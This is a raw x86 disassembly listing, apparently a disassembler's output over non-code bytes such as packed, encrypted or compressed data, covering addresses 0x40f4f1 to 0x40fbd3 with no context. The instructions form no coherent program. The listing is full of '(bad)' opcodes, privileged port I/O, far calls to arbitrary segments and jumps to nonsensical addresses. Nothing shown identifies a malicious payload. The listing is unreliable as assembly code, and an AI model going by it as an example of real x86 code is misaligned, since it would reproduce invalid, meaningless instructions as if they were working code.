  40f4f1:	jbe    0x40f4a3
  40f4f3:	dec    ecx
  40f4f4:	cli    
  40f4f5:	fadd   st,st(5)
  40f4f7:	mov    bl,0x5d
  40f4f9:	(bad)  
  40f4fa:	into   
  40f4fb:	loope  0x40f547
  40f4fd:	enter  0x2e2,0xa0
  40f501:	daa    
  40f502:	push   esi
  40f503:	ds loop 0x40f507
  40f506:	in     al,dx
  40f507:	lahf   
  40f508:	nop
  40f509:	jbe    0x40f4e4
  40f50b:	aaa    
  40f50c:	mov    DWORD PTR [ecx],ecx
  40f50e:	xor    esi,eax
  40f510:	xchg   esp,eax
  40f512:	call   0xec41:0x56a50ea9
  40f519:	dec    edx
  40f51a:	add    eax,0x77fdb2f1
  40f51f:	fs dec ebx
  40f521:	mov    al,ds:0x234f60d5
  40f526:	dec    edx
  40f527:	mov    ebx,ecx
  40f529:	inc    ecx
  40f52a:	(bad)  
  40f52b:	cmp    ah,cl
  40f52d:	out    0x42,eax
  40f52f:	jle    0x40f584
  40f531:	sar    DWORD PTR [edi+0x6c],cl
  40f534:	sub    al,BYTE PTR [ebx+0x65]
  40f537:	in     eax,0xaf
  40f539:	sub    al,0x81
  40f53b:	xor    dh,BYTE PTR [edi+ebx*4+0x8b804a3]
  40f542:	mul    DWORD PTR [ebx+0xe]
  40f545:	push   ebp
  40f546:	dec    ebx
  40f547:	pop    ss
  40f548:	xchg   esp,eax
  40f549:	cmp    al,0x7e
  40f54b:	fs mov ebx,0x5c86509e
  40f551:	arpl   WORD PTR [esi],sp
  40f553:	jns    0x40f582
  40f555:	clc    
  40f556:	ret    0x6f38
  40f559:	xlat   BYTE PTR ds:[ebx]
  40f55a:	fist   DWORD PTR [edi+ecx*1-0x5b]
  40f55e:	push   ebx
  40f55f:	add    DWORD PTR [edi],edi
  40f561:	call   DWORD PTR [edx]
  40f563:	call   0x3dd0:0xf082b7a0
  40f56a:	xchg   esp,eax
  40f56b:	ss dec ebx
  40f56d:	cwde   
  40f56e:	mov    al,ds:0xd4c350e2
  40f573:	addr16 in al,0x63
  40f576:	pusha  
  40f577:	cdq    
  40f578:	xchg   esp,eax
  40f579:	ja     0x40f5f9
  40f57b:	jg     0x40f504
  40f57d:	push   edx
  40f57e:	fisttp DWORD PTR [eax]
  40f580:	mov    eax,ds:0x4ab97f78
  40f585:	add    edi,DWORD PTR [ecx+ebx*4]
  40f588:	mov    ah,0x1
  40f58a:	sub    ebp,DWORD PTR [ebp+0x41]
  40f58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f58e:	xchg   ecx,eax
  40f58f:	int3   
  40f590:	mov    bl,0xc
  40f592:	stos   DWORD PTR es:[edi],eax
  40f593:	ret    0xe78f
  40f596:	push   ecx
  40f597:	cwde   
  40f598:	add    ebp,DWORD PTR [edi+0x668cf5ad]
  40f59e:	sahf   
  40f59f:	out    0x87,eax
  40f5a1:	xor    al,0x28
  40f5a3:	ret    
  40f5a4:	mov    al,ds:0x28b00cac
  40f5a9:	scas   al,BYTE PTR es:[edi]
  40f5aa:	pop    ebp
  40f5ab:	adc    cl,dh
  40f5ad:	loop   0x40f58e
  40f5af:	jmp    0xde2169a5
  40f5b4:	add    di,WORD PTR [edx+edi*8-0x272ad403]
  40f5bc:	(bad)
  40f5c1:	jns    0x40f581
  40f5c3:	xor    eax,0x94bfe043
  40f5c8:	mov    eax,0x794a0bab
  40f5cd:	cmp    DWORD PTR [eax],ebp
  40f5cf:	gs push cs
  40f5d1:	pop    esp
  40f5d2:	push   edx
  40f5d3:	xchg   esi,eax
  40f5d4:	pop    edx
  40f5d5:	shr    ch,0xb0
  40f5d8:	dec    esi
  40f5d9:	lods   al,BYTE PTR ds:[esi]
  40f5da:	and    al,0xe3
  40f5dc:	inc    eax
  40f5dd:	pop    ss
  40f5de:	inc    esi
  40f5df:	add    BYTE PTR [ebx+0x61],cl
  40f5e2:	scas   eax,DWORD PTR es:[edi]
  40f5e3:	push   esi
  40f5e4:	shl    BYTE PTR [edi],cl
  40f5e6:	inc    ebp
  40f5e7:	cmp    eax,0xe8e8e84
  40f5ec:	jae    0x40f5f8
  40f5ee:	(bad)  
  40f5ef:	out    dx,eax
  40f5f0:	mov    al,BYTE PTR [edi+0x5f3845e7]
  40f5f6:	mov    edx,0x9d90ca6b
  40f5fb:	push   ss
  40f5fc:	push   0xffffffeb
  40f5fe:	and    ah,dh
  40f600:	adc    al,0x20
  40f602:	out    dx,eax
  40f603:	cli    
  40f604:	les    edi,FWORD PTR [edx+0xc4b9fd0]
  40f60a:	dec    ebp
  40f60b:	cdq    
  40f60c:	iret   
  40f60d:	sar    BYTE PTR [edx-0x2058f46c],cl
  40f613:	(bad)  
  40f615:	pop    ebx
  40f616:	test   al,0x93
  40f618:	call   0x2a88cd43
  40f61d:	push   ss
  40f61e:	enter  0x6f81,0x22
  40f622:	mov    esp,0x9628e99b
  40f627:	xchg   ecx,eax
  40f628:	fs xchg ebp,eax
  40f62a:	rol    BYTE PTR [ecx-0x47],0x18
  40f62e:	lea    ebp,[ebp+0x69]
  40f631:	iret   
  40f632:	fistp  WORD PTR [esi-0x66]
  40f635:	shl    BYTE PTR [bx],0x3f
  40f639:	mov    ecx,0x58fe363c
  40f63e:	xlat   BYTE PTR ds:[ebx]
  40f63f:	rcr    DWORD PTR [ebx+0x72],0x73
  40f643:	push   esp
  40f644:	out    dx,al
  40f645:	mov    ecx,0x3475c0bf
  40f64a:	cmp    BYTE PTR [eax],ah
  40f64c:	mov    esp,0xaf92015f
  40f651:	data16 fld TBYTE PTR [eax]
  40f654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f655:	jmp    0x3811f5f5
  40f65a:	mov    bh,0xac
  40f65c:	lods   eax,DWORD PTR ds:[esi]
  40f65d:	sub    al,0x22
  40f65f:	cmp    BYTE PTR [ecx],0xc5
  40f662:	fnstenv [ebp-0x77]
  40f665:	loopne 0x40f5f4
  40f667:	fcom   st(1)
  40f669:	push   ss
  40f66a:	and    ebp,DWORD PTR [ecx-0xa]
  40f66d:	inc    ebp
  40f66e:	and    bl,cl
  40f670:	stos   DWORD PTR es:[edi],eax
  40f671:	push   es
  40f672:	scas   al,BYTE PTR es:[edi]
  40f673:	and    cl,BYTE PTR [ebx]
  40f675:	jnp    0x40f677
  40f677:	loopne 0x40f616
  40f679:	push   ds
  40f67a:	mov    dh,0x5e
  40f67c:	xor    esi,esi
  40f67e:	mov    bl,0x32
  40f680:	xor    al,0x67
  40f682:	cmp    eax,DWORD PTR [eax-0x8edbf0f]
  40f688:	fistp  DWORD PTR [edx]
  40f68a:	fld    QWORD PTR [edx]
  40f68c:	std    
  40f68d:	jno    0x40f63b
  40f68f:	repz adc eax,DWORD PTR [ebx]
  40f692:	jbe    0x40f70d
  40f694:	and    DWORD PTR [esi-0x1222087d],ecx
  40f69a:	xchg   esi,eax
  40f69b:	mov    al,ds:0xf43365aa
  40f6a0:	xchg   esp,eax
  40f6a1:	repnz out 0x70,al
  40f6a4:	jb     0x40f639
  40f6a6:	pop    ss
  40f6a7:	fimul  WORD PTR [ecx-0x75]
  40f6aa:	fnstsw WORD PTR [edi+0x795bec27]
  40f6b0:	in     eax,dx
  40f6b1:	nop
  40f6b2:	fild   DWORD PTR [ebp-0x4d9319e1]
  40f6b8:	push   cs
  40f6b9:	inc    edi
  40f6ba:	ss icebp 
  40f6bc:	shl    bl,cl
  40f6be:	jbe    0x40f735
  40f6c0:	jns    0x40f6be
  40f6c2:	sub    DWORD PTR [edi+0x3e],ecx
  40f6c5:	test   al,0x34
  40f6c7:	cmc    
  40f6c8:	jl     0x40f727
  40f6ca:	cmp    al,0x60
  40f6cc:	fwait
  40f6cd:	pop    ecx
  40f6ce:	stos   DWORD PTR es:[edi],eax
  40f6cf:	dec    ebx
  40f6d0:	and    ch,BYTE PTR [edi]
  40f6d2:	sbb    DWORD PTR [ecx+0x7dd41ccb],edx
  40f6d8:	adc    al,0xe0
  40f6da:	pop    edi
  40f6db:	ds xor eax,0xd8b9d994
  40f6e1:	mov    cl,0x43
  40f6e3:	inc    edi
  40f6e4:	jmp    0x40f700
  40f6e6:	dec    edx
  40f6e7:	xor    BYTE PTR [ecx],al
  40f6e9:	cmp    eax,0xb9e598aa
  40f6ee:	outs   dx,DWORD PTR ds:[esi]
  40f6ef:	cmc    
  40f6f0:	aam    0x60
  40f6f2:	sahf   
  40f6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6f4:	inc    esp
  40f6f5:	fs and al,0x0
  40f6f8:	fcomp  QWORD PTR [ebx-0x2e625125]
  40f6fe:	push   ds
  40f6ff:	test   BYTE PTR [ebx-0x3d],bh
  40f702:	outs   dx,BYTE PTR ds:[esi]
  40f703:	pop    ds
  40f704:	gs out 0x33,al
  40f707:	adc    al,0xcc
  40f709:	dec    ebp
  40f70a:	rol    BYTE PTR [ecx],cl
  40f70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f70d:	ins    BYTE PTR es:[edi],dx
  40f70e:	pop    ebp
  40f70f:	data16 jo 0x40f71d
  40f712:	scas   eax,DWORD PTR es:[edi]
  40f713:	arpl   WORD PTR [edi],cx
  40f715:	mov    edx,0x5e36cb37
  40f71a:	sbb    ah,bh
  40f71c:	outs   dx,DWORD PTR gs:[esi]
  40f71e:	scas   al,BYTE PTR es:[edi]
  40f71f:	pop    esp
  40f720:	mov    esp,DWORD PTR [esp+ecx*1+0x34c0d0f9]
  40f727:	jl     0x40f6c4
  40f729:	mov    ah,0xe4
  40f72b:	push   ecx
  40f72c:	in     al,0xdd
  40f72e:	lods   al,BYTE PTR ds:[esi]
  40f72f:	or     DWORD PTR [edi],edx
  40f731:	mov    WORD PTR [ecx+ebx*1+0x20a32632],?
  40f738:	stos   BYTE PTR es:[edi],al
  40f739:	popf   
  40f73a:	inc    esp
  40f73b:	aas    
  40f73c:	scas   eax,DWORD PTR es:[edi]
  40f73d:	imul   edi,edi,0xffffffa1
  40f740:	mov    ch,0x4d
  40f742:	aam    0x8b
  40f744:	fdivr  DWORD PTR ds:0x8b60a436
  40f74a:	pop    ds
  40f74b:	inc    ecx
  40f74c:	test   DWORD PTR [eax-0x53cbb1a9],esp
  40f752:	pop    es
  40f753:	push   esi
  40f754:	out    0x1b,al
  40f756:	loopne 0x40f6ef
  40f758:	jns    0x40f7bd
  40f75a:	sub    edx,ebx
  40f75c:	daa    
  40f75d:	fcmovnb st,st(3)
  40f75f:	adc    DWORD PTR [ebx+0x6cf36c65],ebp
  40f765:	cmp    al,BYTE PTR [edi]
  40f767:	mov    al,ds:0x24db1384
  40f76c:	xor    BYTE PTR [edx+ebp*1+0x22],dl
  40f770:	cli    
  40f771:	xchg   DWORD PTR [esp+edx*1],edx
  40f774:	add    BYTE PTR [edi],0xe
  40f777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f778:	inc    eax
  40f779:	inc    eax
  40f77a:	mov    ds:0xe651e2cd,eax
  40f77f:	sbb    edx,DWORD PTR [ebp-0x24af2931]
  40f785:	sub    al,0xe5
  40f787:	dec    edi
  40f788:	and    dh,ah
  40f78a:	sub    dl,BYTE PTR [eax+0x37]
  40f78d:	lahf   
  40f78e:	addr16 add al,0x96
  40f791:	mov    al,ds:0x2826e285
  40f796:	dec    ecx
  40f797:	(bad)  
  40f798:	out    0xff,al
  40f79a:	jp     0x40f7ae
  40f79c:	push   es
  40f79d:	outs   dx,BYTE PTR ds:[esi]
  40f79e:	pop    edi
  40f79f:	xchg   esp,eax
  40f7a0:	stos   BYTE PTR es:[edi],al
  40f7a1:	push   eax
  40f7a2:	mov    ch,0x75
  40f7a4:	ss mov al,0xd
  40f7a7:	sti    
  40f7a8:	dec    ecx
  40f7a9:	ret    
  40f7aa:	cmp    DWORD PTR es:[esi],ebx
  40f7ad:	sbb    eax,0xf7e1749b
  40f7b2:	nop
  40f7b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b4:	repnz dec edi
  40f7b6:	fcomp  QWORD PTR [edx+0x12]
  40f7b9:	or     ebp,DWORD PTR [ecx+0x52]
  40f7bc:	push   edx
  40f7bd:	clc    
  40f7be:	aas    
  40f7bf:	or     bl,bh
  40f7c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7c2:	mov    bh,0x80
  40f7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7c5:	cmp    ch,dl
  40f7c7:	outs   dx,BYTE PTR ds:[esi]
  40f7c8:	xchg   ebx,eax
  40f7c9:	pop    es
  40f7ca:	lea    eax,[ebx]
  40f7cc:	mov    eax,ds:0xb60fc4d7
  40f7d1:	adc    al,0x2c
  40f7d3:	ds in  al,dx
  40f7d5:	inc    edx
  40f7d6:	cmp    al,0xe2
  40f7d8:	jp     0x40f774
  40f7da:	sub    cl,0xd1
  40f7dd:	pop    ebx
  40f7de:	leave  
  40f7df:	(bad)  
  40f7e0:	xlat   BYTE PTR ds:[ebx]
  40f7e1:	push   0xffffffa3
  40f7e3:	push   ss
  40f7e4:	adc    ah,BYTE PTR [edx]
  40f7e6:	and    BYTE PTR [eax-0x258c738d],ah
  40f7ec:	out    0x50,eax
  40f7ee:	jb     0x40f83c
  40f7f0:	ins    BYTE PTR es:[edi],dx
  40f7f1:	int3   
  40f7f2:	imul   esi,ecx,0x53
  40f7f5:	adc    dh,BYTE PTR [eax+ecx*1+0x2491ece8]
  40f7fc:	pop    edi
  40f7fd:	shr    BYTE PTR [ebx-0x5c],cl
  40f800:	inc    eax
  40f801:	js     0x40f7c6
  40f803:	arpl   WORD PTR [esi-0x5ec2f96e],dx
  40f809:	sbb    BYTE PTR [edi+0x39dcb43e],dl
  40f80f:	dec    esp
  40f810:	dec    edx
  40f811:	(bad)  
  40f812:	xor    dl,BYTE PTR [ecx+0x23]
  40f815:	and    eax,DWORD PTR [ecx+0x6d8d63c2]
  40f81b:	fiadd  WORD PTR [ebp+0xb]
  40f81e:	bound  eax,QWORD PTR [edx]
  40f820:	cmc    
  40f821:	sbb    eax,0x2b9e83eb
  40f826:	cmp    al,0xf9
  40f828:	div    DWORD PTR [eax+esi*2-0x16]
  40f82c:	dec    edi
  40f82d:	lds    eax,FWORD PTR [ebp+0x27]
  40f830:	(bad)  
  40f832:	xchg   ecx,eax
  40f833:	fcom   QWORD PTR [eax]
  40f835:	stos   DWORD PTR es:[edi],eax
  40f836:	jp     0x40f7e1
  40f838:	mov    bl,0x9b
  40f83a:	dec    edx
  40f83b:	test   BYTE PTR [edx+0x32],ah
  40f83e:	and    DWORD PTR [edx-0x615d835],esi
  40f844:	and    DWORD PTR [esi],ebp
  40f846:	shl    BYTE PTR [edx-0x11548feb],1
  40f84c:	outs   dx,BYTE PTR ds:[esi]
  40f84d:	icebp  
  40f84e:	rcr    BYTE PTR [eax],1
  40f850:	or     ebp,DWORD PTR [ecx+0x61]
  40f853:	or     al,BYTE PTR [ebx+ebx*8]
  40f856:	mov    esi,0x8422d4fa
  40f85b:	pop    esp
  40f85c:	xchg   edi,eax
  40f85d:	adc    al,0x8a
  40f85f:	sbb    eax,0x3e857490
  40f864:	out    0xfd,eax
  40f866:	(bad)  
  40f867:	jno    0x40f8ab
  40f869:	mov    cl,0xd5
  40f86b:	cmp    dl,dl
  40f86d:	push   edx
  40f86e:	mov    ds:0x52e1cdf3,al
  40f873:	xchg   ebp,eax
  40f874:	jecxz  0x40f8cb
  40f876:	lods   eax,DWORD PTR gs:[esi]
  40f878:	ja     0x40f802
  40f87a:	imul   ecx,DWORD PTR [esi+edx*8+0x41],0x88938d3c
  40f882:	arpl   WORD PTR ds:0xdcde82b9,di
  40f888:	ret    
  40f889:	not    ebx
  40f88b:	and    dl,BYTE PTR [esi]
  40f88d:	dec    ecx
  40f88e:	lods   eax,DWORD PTR ds:[esi]
  40f88f:	mov    ch,0x71
  40f891:	inc    edx
  40f892:	ret    0xd484
  40f895:	sbb    ebx,eax
  40f897:	aam    0x29
  40f899:	outs   dx,DWORD PTR ds:[esi]
  40f89a:	sbb    al,0xe8
  40f89c:	mov    cs,ecx
  40f89e:	pushf  
  40f89f:	or     eax,0xff3d1957
  40f8a4:	jno    0x40f91e
  40f8a6:	jbe    0x40f8b1
  40f8a8:	push   ebp
  40f8a9:	nop
  40f8aa:	mov    ds,WORD PTR [edi-0x1c]
  40f8ad:	test   al,0xbd
  40f8af:	xchg   BYTE PTR [edx+ebx*4-0x4d],cl
  40f8b3:	cwde   
  40f8b4:	aad    0xe6
  40f8b6:	retf   0x8a7f
  40f8b9:	xor    al,0xc7
  40f8bb:	cmp    BYTE PTR [edi],cl
  40f8bd:	(bad)  
  40f8be:	leave  
  40f8bf:	test   esi,ebp
  40f8c1:	add    edx,DWORD PTR [edi]
  40f8c3:	push   0x6a
  40f8c5:	pop    eax
  40f8c6:	dec    edx
  40f8c7:	push   edx
  40f8c8:	fadd   QWORD PTR [ebp+ecx*2+0x70]
  40f8cc:	mov    bl,cl
  40f8ce:	pusha  
  40f8cf:	cmp    eax,DWORD PTR [ebp+ebp*4-0x67d942be]
  40f8d6:	xor    dl,BYTE PTR [ebp-0x52]
  40f8d9:	(bad)  
  40f8da:	xor    eax,0x41c1ceee
  40f8df:	fld    TBYTE PTR [edi+0x410544e6]
  40f8e5:	mov    ecx,DWORD PTR ds:0xf2d64458
  40f8eb:	mov    BYTE PTR [esi-0x5c70d500],al
  40f8f1:	ret    
  40f8f2:	mov    ds:0x75c3ee3e,eax
  40f8f7:	ret    
  40f8f8:	push   eax
  40f8f9:	fs jp  0x40f93a
  40f8fc:	jno    0x40f92e
  40f8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ff:	aaa    
  40f900:	sub    ebp,eax
  40f902:	lea    eax,[ebx-0x49649af8]
  40f908:	das    
  40f909:	and    eax,0x4c3e0f19
  40f90e:	jnp    0x40f958
  40f910:	lds    edi,FWORD PTR [ecx+0x1685501d]
  40f916:	aam    0x55
  40f918:	sub    ebx,esp
  40f91a:	xchg   ebp,eax
  40f91b:	jne    0x40f94e
  40f91d:	cmp    ebp,DWORD PTR [eax+0x1ceecb80]
  40f923:	call   0xc52:0x3d879ba4
  40f92a:	push   ds
  40f92b:	das    
  40f92c:	retf   0x7c1f
  40f92f:	scas   al,BYTE PTR es:[edi]
  40f930:	sub    al,0x1d
  40f932:	pushf  
  40f933:	xchg   bh,ch
  40f935:	cmp    al,0x8a
  40f937:	ss out 0x39,al
  40f93a:	data16 lods al,BYTE PTR ds:[esi]
  40f93c:	int    0xd
  40f93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f93f:	pop    eax
  40f940:	push   0xffffffde
  40f942:	add    bh,bl
  40f944:	leave  
  40f945:	je     0x40f9ba
  40f947:	push   ecx
  40f948:	call   FWORD PTR [esi-0x54]
  40f94b:	nop
  40f94c:	fwait
  40f94d:	sub    al,0x7b
  40f94f:	cmp    DWORD PTR [edx+ecx*4+0x25],ecx
  40f953:	sar    BYTE PTR [edx],1
  40f955:	test   DWORD PTR [ecx-0x20],ecx
  40f958:	mov    ecx,0x34eb3111
  40f95d:	test   ecx,ebx
  40f95f:	out    0xfa,eax
  40f961:	sub    DWORD PTR [esi],0x11664cda
  40f967:	sbb    eax,0xda8b35c7
  40f96c:	push   esp
  40f96d:	out    0x8a,eax
  40f96f:	outs   dx,BYTE PTR ds:[esi]
  40f970:	push   0xffffff9d
  40f972:	xor    al,0x32
  40f974:	neg    DWORD PTR [ecx+0x2f936719]
  40f97a:	push   0xffffff8e
  40f97c:	cmp    al,0x2e
  40f97e:	mov    DWORD PTR [ecx+0x2a],ebp
  40f981:	in     al,dx
  40f982:	jmp    0x8335a5ad
  40f987:	shl    DWORD PTR [ecx],1
  40f989:	sub    ah,BYTE PTR [edx+0x64]
  40f98c:	jl     0x40f984
  40f98e:	(bad)  [esi+ebx*8-0xdff0f49]
  40f995:	fs mov bh,0x83
  40f998:	xor    dl,BYTE PTR [ebx]
  40f99a:	fucomip st,st(7)
  40f99c:	sub    ebp,DWORD PTR [edx]
  40f99e:	pop    es
  40f99f:	sub    eax,0x3a52fcd9
  40f9a4:	mov    ebx,DWORD PTR [ebx-0x77]
  40f9a7:	dec    ebp
  40f9a8:	xlat   BYTE PTR ds:[ebx]
  40f9a9:	and    al,ch
  40f9ab:	cli    
  40f9ac:	data16 mov dh,0x2a
  40f9af:	neg    BYTE PTR [edi+eiz*1-0x7566f384]
  40f9b6:	sar    BYTE PTR [esi-0x52],0x80
  40f9ba:	in     al,0x9f
  40f9bc:	das    
  40f9bd:	mov    eax,ds:0x396784ff
  40f9c2:	das    
  40f9c3:	cmp    BYTE PTR [edx+ebx*8],bl
  40f9c6:	push   0x74
  40f9c8:	inc    ebp
  40f9c9:	gs out dx,al
  40f9cb:	mov    dl,0x8a
  40f9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ce:	idiv   DWORD PTR [esi+ecx*2-0x21]
  40f9d2:	icebp  
  40f9d3:	out    0x37,al
  40f9d5:	jmp    0x40f9ef
  40f9d7:	icebp  
  40f9d8:	mov    ds:0xf5ec6bd6,al
  40f9dd:	(bad)  
  40f9de:	jecxz  0x40f9a1
  40f9e0:	jnp    0x40f9a0
  40f9e2:	(bad)  
  40f9e3:	retf   0x58ff
  40f9e6:	arpl   si,sp
  40f9e8:	sbb    esi,DWORD PTR [eax-0x5d]
  40f9eb:	add    al,0x34
  40f9ed:	pusha  
  40f9ee:	inc    eax
  40f9ef:	and    edi,DWORD PTR [esi]
  40f9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f2:	pusha  
  40f9f3:	mov    gs,edi
  40f9f5:	cmc    
  40f9f6:	and    cl,BYTE PTR [eax+0x395ac7d3]
  40f9fc:	cmc    
  40f9fd:	pop    edi
  40f9fe:	mov    edx,0xb752804
  40fa03:	push   ds
  40fa04:	ror    eax,0xdb
  40fa07:	aaa    
  40fa08:	and    ch,bh
  40fa0a:	into   
  40fa0b:	test   al,0xe4
  40fa0d:	push   0x59375cde
  40fa12:	rol    edx,1
  40fa14:	jmp    0xd43520b1
  40fa19:	loopne 0x40fa76
  40fa1b:	leave  
  40fa1c:	xchg   edx,eax
  40fa1d:	jge    0x40f9fc
  40fa1f:	sahf   
  40fa20:	fmulp  st(7),st
  40fa22:	jl     0x40fa25
  40fa24:	xchg   BYTE PTR [ecx],ch
  40fa26:	js     0x40f9ef
  40fa28:	cmp    DWORD PTR [edx],eax
  40fa2a:	outs   dx,BYTE PTR ds:[esi]
  40fa2b:	and    edx,DWORD PTR [edx+eiz*1+0x7f]
  40fa2f:	pop    ecx
  40fa30:	les    ecx,FWORD PTR [ecx]
  40fa32:	xchg   BYTE PTR [esi],dl
  40fa34:	fsub   st,st(3)
  40fa36:	mov    ah,0x62
  40fa38:	xchg   edx,eax
  40fa39:	xor    eax,DWORD PTR [esi]
  40fa3b:	fnstcw WORD PTR [ebx+0x4d]
  40fa3e:	mov    ah,0xa0
  40fa40:	pop    edx
  40fa41:	(bad)
  40fa44:	popa   
  40fa45:	sbb    dl,BYTE PTR [edi-0x39174b87]
  40fa4b:	scas   eax,DWORD PTR es:[edi]
  40fa4c:	jnp    0x40fa31
  40fa4e:	xor    eax,0x5dded851
  40fa53:	push   esp
  40fa54:	gs dec esi
  40fa56:	mov    al,ds:0x9bccf3b0
  40fa5b:	gs sahf 
  40fa5d:	icebp  
  40fa5e:	es popf 
  40fa60:	pop    ebx
  40fa61:	mov    ch,0xbc
  40fa63:	add    eax,0xe804ea2c
  40fa68:	add    edx,DWORD PTR [ebx+0x7c]
  40fa6b:	push   edi
  40fa6c:	scas   al,BYTE PTR es:[edi]
  40fa6d:	cli    
  40fa6e:	cmp    BYTE PTR [eiz*1-0x3269f565],dl
  40fa75:	pop    eax
  40fa76:	out    dx,eax
  40fa77:	adc    DWORD PTR [ebp-0x4f295716],edi
  40fa7d:	push   esi
  40fa7e:	jle    0x40fa81
  40fa80:	sbb    ecx,esp
  40fa82:	adc    al,0x76
  40fa84:	scas   eax,DWORD PTR es:[edi]
  40fa85:	add    al,0x44
  40fa87:	data16 idiv BYTE PTR [esi]
  40fa8a:	test   DWORD PTR [esi-0x10],esp
  40fa8d:	fsubrp st(2),st
  40fa8f:	dec    ebp
  40fa90:	mov    esp,0x9bf6063a
  40fa95:	aas    
  40fa96:	and    al,BYTE PTR [ebp-0x3d2149d7]
  40fa9c:	loope  0x40faa3
  40fa9e:	in     al,dx
  40fa9f:	sbb    BYTE PTR [edi],al
  40faa1:	jmp    0x3459dc2c
  40faa6:	pop    es
  40faa7:	ins    BYTE PTR es:[edi],dx
  40faa8:	imul   ebx,eax,0xb218415a
  40faae:	and    bl,BYTE PTR [ebx-0x52]
  40fab1:	cmp    BYTE PTR [ebp+0xc1908b],0x42
  40fab8:	cmp    al,0x50
  40faba:	or     BYTE PTR [ebx+0x23edfa3b],al
  40fac0:	fist   DWORD PTR [esi+0x5]
  40fac3:	and    ebx,esp
  40fac5:	retf   0x159d
  40fac8:	xchg   esi,eax
  40fac9:	lahf   
  40faca:	cli    
  40facb:	inc    ebp
  40facc:	xchg   esp,eax
  40facd:	cmp    ch,dh
  40facf:	cmp    al,0xb3
  40fad1:	shr    DWORD PTR [eax],cl
  40fad3:	outs   dx,DWORD PTR ds:[esi]
  40fad4:	push   0xffffffcd
  40fad6:	sbb    esi,ebp
  40fad8:	push   ss
  40fad9:	xor    DWORD PTR [ebx+ebp*4+0x4e6946a1],ebp
  40fae0:	stos   BYTE PTR es:[edi],al
  40fae1:	push   ss
  40fae2:	ds out 0x6e,al
  40fae5:	shl    DWORD PTR [edi],cl
  40fae7:	jecxz  0x40fb16
  40fae9:	dec    esi
  40faea:	es repnz nop
  40faed:	(bad)  
  40faee:	xor    al,0xfc
  40faf0:	mov    ch,0xa1
  40faf2:	dec    ebx
  40faf3:	dec    edx
  40faf4:	rcr    BYTE PTR [edx-0x6a],0xb
  40faf8:	xchg   ebx,eax
  40faf9:	std    
  40fafa:	call   0x8d858e89
  40faff:	xchg   dl,cl
  40fb01:	bsr    esp,DWORD PTR ds:0x42259ef2
  40fb08:	cmp    ebx,DWORD PTR [ebx]
  40fb0a:	sub    DWORD PTR [eax],ebp
  40fb0c:	cmp    cl,BYTE PTR [ebp-0x41]
  40fb0f:	inc    edi
  40fb10:	or     esi,ecx
  40fb12:	push   edx
  40fb13:	in     al,dx
  40fb14:	loope  0x40fb73
  40fb16:	stos   BYTE PTR es:[edi],al
  40fb17:	ins    BYTE PTR es:[edi],dx
  40fb18:	jno    0x40faaf
  40fb1a:	mov    ebx,0x2f6405d3
  40fb1f:	adc    BYTE PTR [edx],0xd7
  40fb22:	jg     0x40faf1
  40fb24:	ret    
  40fb25:	clc    
  40fb26:	jnp    0x40fad1
  40fb28:	out    dx,eax
  40fb29:	push   edi
  40fb2a:	icebp  
  40fb2b:	bound  ebx,QWORD PTR [ebp+0x51]
  40fb2e:	cmp    eax,0xe9a2cf95
  40fb33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb34:	mov    edi,0x184a602d
  40fb39:	add    BYTE PTR [ecx],0x2b
  40fb3c:	cld    
  40fb3d:	jecxz  0x40fb97
  40fb3f:	adc    dl,BYTE PTR [ebx+0x76e2952a]
  40fb45:	rcl    DWORD PTR [ebx-0x558d0c91],cl
  40fb4b:	in     eax,dx
  40fb4c:	mov    al,ds:0x5df6a60a
  40fb51:	cs dec ebx
  40fb53:	inc    ecx
  40fb54:	and    eax,0xf51a5e78
  40fb59:	retf   
  40fb5a:	mov    ds:0x173a0d9c,al
  40fb5f:	sub    al,0x4b
  40fb61:	mov    al,0xa0
  40fb63:	xor    ah,BYTE PTR [ebp+0x7e05e408]
  40fb69:	out    dx,eax
  40fb6a:	and    ebp,edx
  40fb6c:	outs   dx,DWORD PTR ds:[esi]
  40fb6d:	fistp  DWORD PTR [ebx]
  40fb6f:	lock rcr DWORD PTR [edx+0x3f],cl
  40fb73:	stos   BYTE PTR es:[edi],al
  40fb74:	std    
  40fb75:	xchg   ebx,eax
  40fb76:	rol    BYTE PTR [esi],1
  40fb78:	imul   bh
  40fb7a:	and    eax,0x36e7f6a4
  40fb7f:	sbb    ebp,0xa4271fd9
  40fb85:	push   0xffffffa5
  40fb87:	mov    ebp,0xd4f84296
  40fb8c:	test   edx,ebp
  40fb8e:	stos   BYTE PTR es:[edi],al
  40fb8f:	mov    DWORD PTR ds:0xf1be06a1,edx
  40fb95:	xchg   edi,eax
  40fb96:	fs push es
  40fb98:	adc    BYTE PTR [edi],bl
  40fb9a:	pop    ebp
  40fb9b:	push   edi
  40fb9c:	pop    esp
  40fb9d:	arpl   WORD PTR [ebp-0x337ba0fa],sp
  40fba3:	mov    dl,0xd4
  40fba5:	mov    al,0x1b
  40fba7:	mov    ebx,eax
  40fba9:	call   0xf9a3:0x629a41cc
  40fbb0:	or     bl,BYTE PTR [edi-0x9]
  40fbb3:	push   ecx
  40fbb4:	or     al,BYTE PTR [edx]
  40fbb6:	nop
  40fbb7:	dec    esp
  40fbb8:	(bad)  
  40fbb9:	repz daa 
  40fbbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbbc:	aam    0x50
  40fbbe:	push   eax
  40fbbf:	adc    BYTE PTR [edx],al
  40fbc1:	cmp    eax,0x30de7269
  40fbc6:	adc    al,0xe4
  40fbc8:	call   FWORD PTR [edi]
  40fbca:	(bad)  
  40fbcb:	leave  
  40fbcc:	aas    
  40fbcd:	aaa    
  40fbce:	call   0x7363a6b7
  40fbd3:	addr16 xor al,0xc6
